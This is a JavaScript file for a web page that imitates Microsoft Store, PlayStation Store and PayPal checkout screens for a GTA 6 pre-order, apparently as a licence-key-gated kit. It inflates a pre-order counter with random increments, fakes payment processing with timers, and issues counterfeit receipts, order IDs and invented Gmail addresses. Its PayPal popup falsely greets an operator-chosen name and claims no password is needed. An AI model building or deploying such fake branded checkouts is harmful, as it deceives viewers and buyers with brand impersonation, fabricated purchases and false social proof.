document.addEventListener('DOMContentLoaded', () => {


    // ==========================================================================
    // STATE VARIABLES
    // ==========================================================================
    let currentPlatform = 'xbox'; // 'xbox' or 'ps5'
    let enteredUsername = '';
    let preorderTotal = 20584;
    let selectedEdition = 'standard';
    let selectedPrice = 69.99;

    // Target Date: November 19, 2026
    const targetDate = new Date('November 19, 2026 00:00:00').getTime();

    // ==========================================================================
    // DOM ELEMENTS
    // ==========================================================================
    // Countdown
    const daysEl = document.getElementById('days');
    const hoursEl = document.getElementById('hours');
    const minsEl = document.getElementById('mins');
    const secsEl = document.getElementById('secs');

    // Preorder counter
    const preorderCountEl = document.getElementById('preorder-count');

    // ==========================================================================
    // KEY ACTIVATION SYSTEM
    // ==========================================================================
    const keyModalOverlay = document.getElementById('key-modal-overlay');
    const keyInput = document.getElementById('key-input');
    const btnActivateKey = document.getElementById('btn-activate-key');
    const keyErrorMsg = document.getElementById('key-error-msg');

    function getDeviceFingerprint() {
        return btoa(navigator.userAgent + screen.width + 'x' + screen.height).slice(0, 32);
    }
    const fingerprint = getDeviceFingerprint();

    if (keyModalOverlay) {
        const storedKey = localStorage.getItem('gta6_activated_key');
        if (storedKey) {
            fetch('/api/verify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ key: storedKey, fingerprint })
            })
            .then(res => res.json())
            .then(data => {
                if (data.valid) {
                    keyModalOverlay.classList.remove('active');
                } else {
                    localStorage.removeItem('gta6_activated_key');
                    keyModalOverlay.classList.add('active');
                }
            })
            .catch(() => {
                keyModalOverlay.classList.remove('active');
            });
        } else {
            keyModalOverlay.classList.add('active');
        }

        if (btnActivateKey) {
            btnActivateKey.addEventListener('click', () => {
                const rawKey = keyInput.value.trim().toUpperCase();
                if (!rawKey) {
                    keyErrorMsg.textContent = 'Please enter an access key.';
                    keyErrorMsg.style.display = 'block';
                    return;
                }

                btnActivateKey.disabled = true;
                btnActivateKey.textContent = 'Verifying key...';
                keyErrorMsg.style.display = 'none';

                fetch('/api/activate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ key: rawKey, fingerprint })
                })
                .then(res => res.json())
                .then(data => {
                    btnActivateKey.disabled = false;
                    btnActivateKey.textContent = 'Activate Access';

                    if (data.success) {
                        localStorage.setItem('gta6_activated_key', rawKey);
                        keyModalOverlay.classList.remove('active');
                    } else {
                        keyErrorMsg.textContent = data.message || 'Invalid or expired access key.';
                        keyErrorMsg.style.display = 'block';
                    }
                })
                .catch(() => {
                    btnActivateKey.disabled = false;
                    btnActivateKey.textContent = 'Activate Access';
                    keyErrorMsg.textContent = 'Connection error. Please try again.';
                    keyErrorMsg.style.display = 'block';
                });
            });
        }
    }
    const modalCard = document.getElementById('modal-card');
    const closeBtns = document.querySelectorAll('.close-modal-btn');

    // Platform buttons
    const btnPs5 = document.getElementById('btn-ps5');
    const btnXbox = document.getElementById('btn-xbox');

    // Modal Stage Elements
    const stageSelectEdition = document.getElementById('stage-select-edition');
    const stageLink = document.getElementById('stage-link');
    const stageConfirm = document.getElementById('stage-confirm');
    const stageCheckout = document.getElementById('stage-checkout');
    const stageSuccess = document.getElementById('stage-success');

    // Stage 0 (Select Edition) Elements
    const selectStoreTitle = document.getElementById('select-store-title');
    const cardStandardEdition = document.getElementById('card-standard-edition');
    const cardUltimateEdition = document.getElementById('card-ultimate-edition');
    const btnNextEdition = document.getElementById('btn-next-edition');

    // Stage 1 (Link Account) Elements
    const linkStoreTitle = document.getElementById('link-store-title');
    const linkInputHeading = document.getElementById('link-input-heading');
    const gamertagInput = document.getElementById('gamertag-input');
    const btnFindAccount = document.getElementById('btn-find-account');
    const gamertagError = document.getElementById('gamertag-error');
    const btnBackLanding = document.querySelector('.btn-back-landing');
    const btnBackToEdition = document.getElementById('btn-back-to-edition');

    // Stage 2 (Confirmation) Elements
    const confirmStoreTitle = document.getElementById('confirm-store-title');
    const confirmAvatarImg = document.getElementById('confirm-avatar-img');
    const confirmUsernameText = document.getElementById('confirm-username-text');
    const confirmPlatformText = document.getElementById('confirm-platform-text');
    const btnConfirmYes = document.getElementById('btn-confirm-yes');
    const btnConfirmNo = document.getElementById('btn-confirm-no');
    const btnBackToLink = document.getElementById('btn-back-to-link');
    const avatarSyncTip = document.getElementById('avatar-sync-tip');
    const syncTipText = document.getElementById('sync-tip-text');

    // Stage 3 (Checkout) Elements
    const checkoutStoreTitle = document.getElementById('checkout-store-title');
    const checkoutRefCode = document.getElementById('checkout-ref-code');
    const checkoutDeliverUsername = document.getElementById('checkout-deliver-username');
    const checkoutPlatformBadge = document.getElementById('checkout-platform-badge');
    const btnConfirmPurchase = document.getElementById('btn-confirm-purchase');
    const btnBackToConfirm = document.getElementById('btn-back-to-confirm');
    const checkoutCoverImg = document.getElementById('checkout-cover-img');
    const checkoutEditionText = document.getElementById('checkout-edition-text');
    const checkoutPriceLabel = document.getElementById('checkout-price-label');
    const checkoutPriceValue = document.getElementById('checkout-price-value');
    const checkoutVatValue = document.getElementById('checkout-vat-value');
    const checkoutTotalValue = document.getElementById('checkout-total-value');

    // Stage 4 (Success) Elements
    const successUsername = document.getElementById('success-username');
    const successPlatform = document.getElementById('success-platform');
    const receiptOrderId = document.getElementById('receipt-order-id');
    const receiptEmail = document.getElementById('receipt-email');
    const btnSuccessDone = document.getElementById('btn-success-done');
    const successEditionText = document.getElementById('success-edition-text');
    const receiptTotalValue = document.getElementById('receipt-total-value');

    // Custom Profile Picture Uploader Elements
    const avatarDropzone = document.getElementById('avatar-dropzone');
    const avatarFileInput = document.getElementById('avatar-file-input');
    let uploadedAvatarBase64 = null;

    // ==========================================================================
    // COUNTDOWN TIMER LOGIC
    // ==========================================================================
    function updateCountdown() {
        const now = new Date().getTime();
        const difference = targetDate - now;

        if (difference <= 0) {
            // Target date reached
            daysEl.textContent = '00';
            hoursEl.textContent = '00';
            minsEl.textContent = '00';
            secsEl.textContent = '00';
            return;
        }

        const days = Math.floor(difference / (1000 * 60 * 60 * 24));
        const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((difference % (1000 * 60)) / 1000);

        daysEl.textContent = formatTimeNumber(days);
        hoursEl.textContent = formatTimeNumber(hours);
        minsEl.textContent = formatTimeNumber(minutes);
        secsEl.textContent = formatTimeNumber(seconds);
    }

    function formatTimeNumber(num) {
        return num < 10 ? '0' + num : num;
    }

    // Run immediately and then every second
    updateCountdown();
    setInterval(updateCountdown, 1000);

    // ==========================================================================
    // DYNAMIC PRE-ORDER COUNTER INCREMENTS
    // ==========================================================================
    function formatCount(num) {
        return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
    }

    function incrementPreorder() {
        // Increment by a random small number (1 to 3) to feel organic
        const increment = Math.floor(Math.random() * 3) + 1;
        preorderTotal += increment;
        
        preorderCountEl.innerHTML = `<span class="count-num">${formatCount(preorderTotal)}</span> pre-orders in the last 24h`;
        
        // Dynamic pulse animation trigger
        const pulseDot = preorderCountEl.previousElementSibling;
        if (pulseDot) {
            pulseDot.style.animation = 'none';
            // Force reflow
            void pulseDot.offsetWidth;
            pulseDot.style.animation = 'pulse 1.8s infinite';
        }
    }

    // Increment every 4 to 8 seconds
    setInterval(incrementPreorder, 5000);

    // ==========================================================================
    // STAGE NAVIGATION UTILITIES
    // ==========================================================================
    function setStage(stageEl) {
        // Hide all stages
        document.querySelectorAll('.modal-stage').forEach(stage => {
            stage.classList.remove('active');
        });
        // Show specified stage
        stageEl.classList.add('active');
    }

    function openModal(platform) {
        currentPlatform = platform;
        enteredUsername = '';
        gamertagInput.value = '';
        gamertagError.style.display = 'none';
        
        // Reset edition selection
        selectedEdition = 'standard';
        selectedPrice = 69.99;
        cardStandardEdition.classList.add('selected');
        cardUltimateEdition.classList.remove('selected');

        // Reset checkout button state if present
        if (btnConfirmPurchase) {
            btnConfirmPurchase.disabled = false;
            btnConfirmPurchase.textContent = 'Confirm purchase - £69.99';
        }
        
        // Reset payment method to VISA
        if (typeof setPaymentMethod === 'function') {
            setPaymentMethod('visa');
        }

        // Apply platform theme to card
        modalCard.className = 'modal-card'; // clear previous theme
        if (platform === 'xbox') {
            modalCard.classList.add('theme-xbox');
            
            // Set Stage 0 Text
            selectStoreTitle.textContent = 'MICROSOFT STORE · SELECT EDITION';

            // Set Stage 1 Text
            linkStoreTitle.textContent = 'MICROSOFT STORE · LINK ACCOUNT';
            linkInputHeading.textContent = 'Enter your Xbox Gamertag';
            gamertagInput.placeholder = 'Johnsonxbox892 Xbox';
            
            // Set Stage 2 Text
            confirmStoreTitle.textContent = 'MICROSOFT STORE · ACCOUNT VERIFICATION';
            confirmAvatarImg.src = 'assets/avatar_xbox.png';
            confirmPlatformText.textContent = 'Xbox Live Network';
            
            // Set Stage 3 Text
            checkoutStoreTitle.textContent = 'Microsoft Store · Checkout';
            checkoutPlatformBadge.textContent = 'XBOX SERIES X|S';
            checkoutRefCode.textContent = `XBL-${generateRandomCode()}`;
            
        } else {
            modalCard.classList.add('theme-psn');
            
            // Set Stage 0 Text
            selectStoreTitle.textContent = 'PLAYSTATION STORE · SELECT EDITION';

            // Set Stage 1 Text
            linkStoreTitle.textContent = 'PLAYSTATION NETWORK · LINK ACCOUNT';
            linkInputHeading.textContent = 'Enter your PSN Online ID';
            gamertagInput.placeholder = 'Johnsonpsn892';
            
            // Set Stage 2 Text
            confirmStoreTitle.textContent = 'PLAYSTATION NETWORK · ACCOUNT VERIFICATION';
            confirmAvatarImg.src = 'assets/avatar_psn.png';
            confirmPlatformText.textContent = 'PlayStation Network';
            
            // Set Stage 3 Text
            checkoutStoreTitle.textContent = 'PlayStation Store · Checkout';
            checkoutPlatformBadge.textContent = 'PLAYSTATION 5';
            checkoutRefCode.textContent = `PSN-${generateRandomCode()}`;
        }

        // Set to stage 0 (Select Edition) and open modal
        setStage(stageSelectEdition);
        modalContainer.classList.add('active');
    }

    function closeModal() {
        modalContainer.classList.remove('active');
    }

    function generateRandomCode() {
        // e.g. 5406-398653
        const part1 = Math.floor(1000 + Math.random() * 9000);
        const part2 = Math.floor(100000 + Math.random() * 900000);
        return `${part1}-${part2}`;
    }

    function getDeviceOrSessionHash(input) {
        const str = (input || '') + navigator.userAgent + screen.width + screen.height + new Date().getTimezoneOffset();
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            hash = (hash << 5) - hash + str.charCodeAt(i);
            hash |= 0;
        }
        return Math.abs(hash);
    }

    function generateUniqueEmail(username) {
        const firstNames = [
            'thomas', 'alexandre', 'julien', 'lucas', 'maxime', 'antoine', 'nicolas',
            'david', 'florian', 'benjamin', 'marcus', 'hugo', 'mathieu', 'romain',
            'dylan', 'clement', 'quentin', 'baptiste', 'valentin', 'samuel'
        ];
        const lastNames = [
            'dupont', 'martin', 'bernard', 'dubois', 'moreau', 'laurent', 'lefebvre',
            'garcia', 'roux', 'fournier', 'girard', 'bonnet', 'mercier', 'perrier',
            'gautier', 'fontaine', 'chevalier', 'robin', 'masson', 'sanchez'
        ];

        const hash = getDeviceOrSessionHash(username);
        const fnIndex = hash % firstNames.length;
        const lnIndex = Math.floor(hash / firstNames.length) % lastNames.length;
        const num = (hash % 89) + 10;

        return `${firstNames[fnIndex]}.${lastNames[lnIndex]}${num}@gmail.com`;
    }

    // ==========================================================================
    // INTERACTIVE FLOW EVENT LISTENERS
    // ==========================================================================
    
    // Open buttons
    btnXbox.addEventListener('click', () => openModal('xbox'));
    btnPs5.addEventListener('click', () => openModal('ps5'));

    // Close buttons
    closeBtns.forEach(btn => {
        btn.addEventListener('click', closeModal);
    });

    // Close modal on click outside card
    modalContainer.addEventListener('click', (e) => {
        if (e.target === modalContainer) {
            closeModal();
        }
    });

    // Back to landing from Stage 0 (Close Modal)
    btnBackLanding.addEventListener('click', (e) => {
        e.preventDefault();
        closeModal();
    });

    // Stage 0 Edition Cards Click Events
    cardStandardEdition.addEventListener('click', () => {
        selectedEdition = 'standard';
        cardStandardEdition.classList.add('selected');
        cardUltimateEdition.classList.remove('selected');
        if (typeof updateCurrencyAndPrices === 'function') {
            updateCurrencyAndPrices();
        }
    });

    cardUltimateEdition.addEventListener('click', () => {
        selectedEdition = 'ultimate';
        cardUltimateEdition.classList.add('selected');
        cardStandardEdition.classList.remove('selected');
        if (typeof updateCurrencyAndPrices === 'function') {
            updateCurrencyAndPrices();
        }
    });

    // Stage 0 -> Stage 1 (Link Account)
    btnNextEdition.addEventListener('click', () => {
        // Update Stage 1 subtitle description text
        const editionName = selectedEdition === 'standard' ? 'Standard Edition' : 'Ultimate Edition';
        const linkSubtitle = stageLink.querySelector('.modal-subtitle-main');
        linkSubtitle.innerHTML = `We'll attach <strong>${editionName}</strong> to this profile on release day.`;

        setStage(stageLink);
        gamertagInput.focus();
    });

    // Stage 1 -> Back to Stage 0 (Select Edition)
    btnBackToEdition.addEventListener('click', (e) => {
        e.preventDefault();
        setStage(stageSelectEdition);
    });

    // Validate Gamertag -> Move to Stage 2 (Confirmation)
    btnFindAccount.addEventListener('click', () => {
        const rawInput = gamertagInput.value.trim();
        
        if (rawInput.length < 3) {
            gamertagError.style.display = 'block';
            gamertagInput.focus();
            return;
        }

        gamertagError.style.display = 'none';
        enteredUsername = rawInput;

        confirmUsernameText.textContent = enteredUsername;

        // Set authentic platform avatar (Xbox / PlayStation profile picture)
        const fallbackAvatar = currentPlatform === 'xbox' ? 'assets/avatar_xbox.png' : 'assets/avatar_psn.png';
        confirmAvatarImg.onerror = function() {
            this.onerror = null;
            this.src = fallbackAvatar;
        };
        confirmAvatarImg.src = `https://unavatar.io/${currentPlatform === 'xbox' ? 'xbox' : 'psnprofiles'}/${encodeURIComponent(enteredUsername)}`;

        // Hide the sync tip container
        avatarSyncTip.style.display = 'none';

        // Advance
        setStage(stageConfirm);
    });

    // Handle pressing Enter inside the gamertag input field
    gamertagInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            btnFindAccount.click();
        }
    });

    // Stage 2: Back to Stage 1
    btnBackToLink.addEventListener('click', (e) => {
        e.preventDefault();
        setStage(stageLink);
        gamertagInput.focus();
    });

    btnConfirmNo.addEventListener('click', () => {
        setStage(stageLink);
        gamertagInput.focus();
    });

    // Stage 2: Yes -> Go to Stage 3 (Checkout)
    btnConfirmYes.addEventListener('click', () => {
        // Populate Checkout elements dynamically based on selected edition
        checkoutDeliverUsername.textContent = enteredUsername;
        
        if (selectedEdition === 'standard') {
            checkoutCoverImg.src = 'assets/gta6_cover.png';
            checkoutEditionText.textContent = 'Standard Edition';
        } else {
            checkoutCoverImg.src = 'assets/gta6_ultimate_edition.png';
            checkoutEditionText.textContent = 'Ultimate Edition';
        }

        // Dynamically update currency and prices for Stage 3
        if (typeof updateCurrencyAndPrices === 'function') {
            updateCurrencyAndPrices();
        }

        setStage(stageCheckout);
    });

    // Stage 3: Back buttons
    btnBackToConfirm.addEventListener('click', (e) => {
        e.preventDefault();
        setStage(stageConfirm);
    });

    const btnPaypalBackPill = document.getElementById('btn-paypal-back-pill');
    if (btnPaypalBackPill) {
        btnPaypalBackPill.addEventListener('click', () => {
            setStage(stageConfirm);
        });
    }

    // Stage 3: Confirm Purchase -> Loading -> Success (Optional legacy button)
    if (btnConfirmPurchase) {
        btnConfirmPurchase.addEventListener('click', () => {
            btnConfirmPurchase.disabled = true;
            btnConfirmPurchase.innerHTML = `
                <svg class="spinner" viewBox="0 0 50 50" style="width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 8px;">
                    <circle cx="25" cy="25" r="20" fill="none" stroke="currentColor" stroke-width="5" stroke-dasharray="80, 200" stroke-dashoffset="0" style="stroke-linecap: round;"></circle>
                </svg>
                Processing secure pre-order...
            `;

            // Simulate secure verification
            setTimeout(() => {
                // Setup Success Screen values
                successUsername.textContent = enteredUsername;
                successPlatform.textContent = currentPlatform === 'xbox' ? 'Xbox Series X|S' : 'PlayStation 5';
                
                // Set dynamic edition name and price on receipt
                const editionName = selectedEdition === 'standard' ? 'Standard Edition' : 'Ultimate Edition';
                successEditionText.textContent = editionName;
                receiptTotalValue.textContent = '£' + selectedPrice.toFixed(2);

                receiptOrderId.textContent = `816-${Math.floor(1000 + Math.random() * 9000)}-${Math.floor(100000 + Math.random() * 900000)}`;
                
                receiptEmail.textContent = generateUniqueEmail(enteredUsername);

                setStage(stageSuccess);
                
                // Add a permanent preorder increment for the active user purchase
                preorderTotal += 1;
                preorderCountEl.innerHTML = `<span class="count-num">${formatCount(preorderTotal)}</span> pre-orders in the last 24h`;
            }, 1800);
        });
    }

    // Stage 4: Done -> Close Modal
    btnSuccessDone.addEventListener('click', () => {
        closeModal();
    });

    // ==========================================================================
    // STAGE 3 PAYMENT RADIO SELECTION & PAYPAL POPUP FLOW
    // ==========================================================================
    const cardPaypal = document.getElementById('option-card-paypal');
    const cardVisa = document.getElementById('option-card-visa');
    const btnTriggerPaypal = document.getElementById('btn-trigger-paypal');
    let currentPaymentMethod = 'paypal'; // 'paypal' or 'visa'

    if (cardPaypal && cardVisa) {
        cardPaypal.addEventListener('click', () => {
            currentPaymentMethod = 'paypal';
            cardPaypal.classList.add('active');
            cardVisa.classList.remove('active');

            if (btnTriggerPaypal) {
                btnTriggerPaypal.className = 'paypal-yellow-btn';
                btnTriggerPaypal.innerHTML = `Pay with <span class="paypal-btn-brand">PayPal</span>`;
            }
        });

        cardVisa.addEventListener('click', () => {
            currentPaymentMethod = 'visa';
            cardVisa.classList.add('active');
            cardPaypal.classList.remove('active');

            if (btnTriggerPaypal) {
                btnTriggerPaypal.className = 'paypal-yellow-btn visa-active-btn';
                btnTriggerPaypal.innerHTML = `Pay with <strong style="font-style:italic; font-weight:900; letter-spacing:0.05em; color:#1a1f71; background:#ffffff; padding:2px 8px; border-radius:4px; margin-left:4px;">VISA</strong>`;
            }
        });
    }

    // PayPal Popup Elements
    const paypalPopupScreen = document.getElementById('paypal-popup-screen');
    const btnClosePaypalPopup = document.getElementById('btn-close-paypal-popup');
    const btnCancelPaypalPopup = document.getElementById('btn-cancel-paypal-popup');
    const btnCompletePaypalPurchase = document.getElementById('btn-complete-paypal-purchase');
    
    const paypalViewLoading = document.getElementById('paypal-view-loading');
    const paypalViewCheckout = document.getElementById('paypal-view-checkout');
    const ppLoadHeading = document.getElementById('pp-load-heading');
    const ppLoadSubheading = document.getElementById('pp-load-subheading');
    const ppUserInitials = document.getElementById('pp-user-initials');

    function openPaypalPopup() {
        const firstName = (customPaypalName || 'Mark').trim();
        const capitalizedFirstName = firstName.charAt(0).toUpperCase() + firstName.slice(1);
        const initials = firstName.slice(0, 2).toUpperCase();

        if (ppUserInitials) ppUserInitials.textContent = initials;
        if (btnCancelPaypalPopup) {
            btnCancelPaypalPopup.textContent = `Cancel and return to ${currentPlatform === 'xbox' ? 'Microsoft Store' : 'PlayStation Store'}`;
        }

        // Reset to Step 1: Preparing checkout
        ppLoadHeading.textContent = 'Preparing checkout';
        ppLoadSubheading.textContent = 'Fetching available PayPal payment methods...';
        paypalViewLoading.classList.add('active');
        paypalViewCheckout.classList.remove('active');

        // Show Popup
        paypalPopupScreen.classList.add('active');

        // Step 1b: Ready (after 1s)
        setTimeout(() => {
            if (paypalPopupScreen.classList.contains('active')) {
                ppLoadHeading.textContent = 'Ready';
                ppLoadSubheading.textContent = 'PayPal checkout loaded';
            }
        }, 1000);

        // Step 1c: Welcome recognition (after 1.9s)
        setTimeout(() => {
            if (paypalPopupScreen.classList.contains('active')) {
                ppLoadHeading.textContent = `Welcome, ${capitalizedFirstName}!`;
                ppLoadSubheading.textContent = 'We recognize you on this device, so no need to enter your password for this purchase.';
            }
        }, 1900);

        // Step 2: Full Checkout View (after 3.0s)
        setTimeout(() => {
            if (paypalPopupScreen.classList.contains('active')) {
                paypalViewLoading.classList.remove('active');
                paypalViewCheckout.classList.add('active');
            }
        }, 3000);
    }

    function closePaypalPopup() {
        paypalPopupScreen.classList.remove('active');
    }

    if (btnTriggerPaypal) {
        btnTriggerPaypal.addEventListener('click', () => {
            if (currentPaymentMethod === 'paypal') {
                openPaypalPopup();
            } else {
                // Direct Card/VISA Checkout (No PayPal popup animation)
                btnTriggerPaypal.disabled = true;
                btnTriggerPaypal.innerHTML = `
                    <svg class="spinner" viewBox="0 0 50 50" style="width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 8px;">
                        <circle cx="25" cy="25" r="20" fill="none" stroke="currentColor" stroke-width="5" stroke-dasharray="80, 200" stroke-dashoffset="0" style="stroke-linecap: round;"></circle>
                    </svg>
                    Processing secure VISA card payment...
                `;

                setTimeout(() => {
                    btnTriggerPaypal.disabled = false;
                    btnTriggerPaypal.className = 'paypal-yellow-btn';
                    btnTriggerPaypal.innerHTML = `Pay with <span class="paypal-btn-brand">PayPal</span>`;

                    // Setup Success Receipt Screen
                    successUsername.textContent = enteredUsername;
                    successPlatform.textContent = currentPlatform === 'xbox' ? 'Xbox Series X|S' : 'PlayStation 5';
                    
                    const editionName = selectedEdition === 'standard' ? 'Standard Edition' : 'Ultimate Edition';
                    successEditionText.textContent = editionName;
                    receiptTotalValue.textContent = '£' + selectedPrice.toFixed(2);
                    receiptOrderId.textContent = `816-${Math.floor(1000 + Math.random() * 9000)}-${Math.floor(100000 + Math.random() * 900000)}`;
                    receiptEmail.textContent = generateUniqueEmail(enteredUsername);

                    // Advance to Success
                    setStage(stageSuccess);
                    
                    // Increment preorder counter
                    preorderTotal += 1;
                    preorderCountEl.innerHTML = `<span class="count-num">${formatCount(preorderTotal)}</span> pre-orders in the last 24h`;
                }, 1500);
            }
        });
    }

    if (btnClosePaypalPopup) {
        btnClosePaypalPopup.addEventListener('click', closePaypalPopup);
    }

    if (btnCancelPaypalPopup) {
        btnCancelPaypalPopup.addEventListener('click', (e) => {
            e.preventDefault();
            closePaypalPopup();
        });
    }

    // Confirm purchase inside PayPal window
    if (btnCompletePaypalPurchase) {
        btnCompletePaypalPurchase.addEventListener('click', () => {
            btnCompletePaypalPurchase.disabled = true;
            btnCompletePaypalPurchase.textContent = 'Completing purchase...';

            setTimeout(() => {
                btnCompletePaypalPurchase.disabled = false;
                btnCompletePaypalPurchase.textContent = 'Complete Purchase';

                // Close Popup
                closePaypalPopup();

                // Setup Success Receipt Screen
                successUsername.textContent = enteredUsername;
                successPlatform.textContent = currentPlatform === 'xbox' ? 'Xbox Series X|S' : 'PlayStation 5';
                
                const editionName = selectedEdition === 'standard' ? 'Standard Edition' : 'Ultimate Edition';
                successEditionText.textContent = editionName;
                receiptTotalValue.textContent = currentCurrencySymbol + selectedPrice.toFixed(2);
                receiptOrderId.textContent = `816-${Math.floor(1000 + Math.random() * 9000)}-${Math.floor(100000 + Math.random() * 900000)}`;
                receiptEmail.textContent = generateUniqueEmail(enteredUsername);

                // Advance main modal to Success
                setStage(stageSuccess);
                
                // Increment preorder counter
                preorderTotal += 1;
                preorderCountEl.innerHTML = `<span class="count-num">${formatCount(preorderTotal)}</span> pre-orders in the last 24h`;
            }, 1400);
        });
    }

    // ==========================================================================
    // SETTINGS MODAL & DYNAMIC CURRENCY / PAYPAL NAME HANDLER
    // ==========================================================================
    const btnOpenSettings = document.getElementById('btn-open-settings');
    const btnCloseSettings = document.getElementById('btn-close-settings');
    const settingsModalOverlay = document.getElementById('settings-modal-overlay');
    const currencyCards = document.querySelectorAll('.currency-card');
    const settingsPaypalInput = document.getElementById('settings-paypal-name-input');

    let currentCurrencyCode = 'GBP';
    let currentCurrencySymbol = '£';
    let currentStandardPrice = 69.99;
    let currentUltimatePrice = 99.99;
    let customPaypalName = 'Mark';

    // Helper to persist IP settings to server & local storage
    function saveIpSettings() {
        localStorage.setItem('gta6_saved_currency', currentCurrencyCode);
        localStorage.setItem('gta6_saved_paypal_name', customPaypalName);

        fetch('/api/user-settings', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ currency: currentCurrencyCode, paypalName: customPaypalName })
        }).catch(err => console.log('Settings save:', err));
    }

    function applyCurrencyCode(code) {
        const cardToActivate = document.querySelector(`.currency-card[data-currency="${code}"]`);
        if (cardToActivate) {
            currencyCards.forEach(c => c.classList.remove('active'));
            cardToActivate.classList.add('active');

            currentCurrencyCode = code;
            currentCurrencySymbol = cardToActivate.getAttribute('data-symbol') || '$';
            currentStandardPrice = parseFloat(cardToActivate.getAttribute('data-standard')) || 69.99;
            currentUltimatePrice = parseFloat(cardToActivate.getAttribute('data-ultimate')) || 99.99;

            updateCurrencyAndPrices();
        }
    }

    // Load IP Settings on initial page load
    function loadIpSettings() {
        const localCurr = localStorage.getItem('gta6_saved_currency');
        const localName = localStorage.getItem('gta6_saved_paypal_name');
        if (localName) {
            customPaypalName = localName;
            if (settingsPaypalInput) settingsPaypalInput.value = localName;
        }
        if (localCurr) {
            applyCurrencyCode(localCurr);
        }

        fetch('/api/user-settings')
            .then(res => res.json())
            .then(data => {
                if (data && data.success && data.settings) {
                    if (data.settings.paypalName) {
                        customPaypalName = data.settings.paypalName;
                        if (settingsPaypalInput) settingsPaypalInput.value = data.settings.paypalName;
                    }
                    if (data.settings.currency) {
                        applyCurrencyCode(data.settings.currency);
                    }
                }
            })
            .catch(err => console.log('IP settings load:', err));
    }

    function updateCurrencyAndPrices() {
        selectedPrice = selectedEdition === 'standard' ? currentStandardPrice : currentUltimatePrice;
        const formattedPrice = currentCurrencySymbol + selectedPrice.toFixed(2);
        const formattedStandard = currentCurrencySymbol + currentStandardPrice.toFixed(2);
        const formattedUltimate = currentCurrencySymbol + currentUltimatePrice.toFixed(2);

        // Update Stage 0 edition card prices
        const cardStandard = document.getElementById('card-standard-edition');
        const cardUltimate = document.getElementById('card-ultimate-edition');
        if (cardStandard) {
            const priceEl = cardStandard.querySelector('.edition-price');
            if (priceEl) priceEl.textContent = formattedStandard;
        }
        if (cardUltimate) {
            const priceEl = cardUltimate.querySelector('.edition-price');
            if (priceEl) priceEl.textContent = formattedUltimate;
        }

        // Update Stage 3 Checkout prices
        const topPrice = document.getElementById('checkout-top-price');
        const subtotalVal = document.getElementById('summary-subtotal-val');
        const totalVal = document.getElementById('summary-total-val');
        const ppTopVal = document.getElementById('pp-top-price-val');
        const ppBalVal = document.getElementById('pp-balance-amount');

        if (topPrice) topPrice.textContent = formattedPrice;
        if (subtotalVal) subtotalVal.textContent = formattedPrice;
        if (totalVal) totalVal.textContent = formattedPrice;
        if (ppTopVal) ppTopVal.textContent = formattedPrice;
        if (ppBalVal) ppBalVal.textContent = formattedPrice;

        // Update Stage 4 Receipt total
        if (receiptTotalValue) receiptTotalValue.textContent = formattedPrice;
    }

    if (btnOpenSettings) {
        btnOpenSettings.addEventListener('click', () => {
            settingsModalOverlay.classList.add('active');
        });
    }

    if (btnCloseSettings) {
        btnCloseSettings.addEventListener('click', () => {
            settingsModalOverlay.classList.remove('active');
        });
    }

    if (settingsModalOverlay) {
        settingsModalOverlay.addEventListener('click', (e) => {
            if (e.target === settingsModalOverlay) {
                settingsModalOverlay.classList.remove('active');
            }
        });
    }

    currencyCards.forEach(card => {
        card.addEventListener('click', () => {
            const code = card.getAttribute('data-currency') || 'GBP';
            applyCurrencyCode(code);
            saveIpSettings();
        });
    });

    if (settingsPaypalInput) {
        settingsPaypalInput.addEventListener('input', () => {
            customPaypalName = settingsPaypalInput.value.trim() || 'Mark';
            saveIpSettings();
        });
    }

    // Initialize IP settings restore
    loadIpSettings();
});

// CSS Injection for dynamic spinner
const style = document.createElement('style');
style.textContent = `
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
`;
document.head.appendChild(style);
